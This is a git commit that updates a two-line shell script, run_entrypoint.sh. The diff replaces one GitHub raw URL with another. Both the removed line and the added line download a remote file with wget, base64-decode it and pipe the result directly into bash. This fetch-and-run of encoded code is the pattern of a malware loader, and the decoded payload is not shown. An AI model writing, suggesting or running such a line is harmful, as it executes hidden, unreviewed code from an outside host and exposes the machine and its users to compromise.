2e4ae283195b00f98e313a17d9415156bd1c6be6
ziggywelch30711 <ziggywelch307@gmail.com>
2026-05-24 00:30:19 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/ziggywelch307/welch/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/ziggywelch30711/rainlicker/refs/heads/main/entrypoint.sh | base64 -d | bash
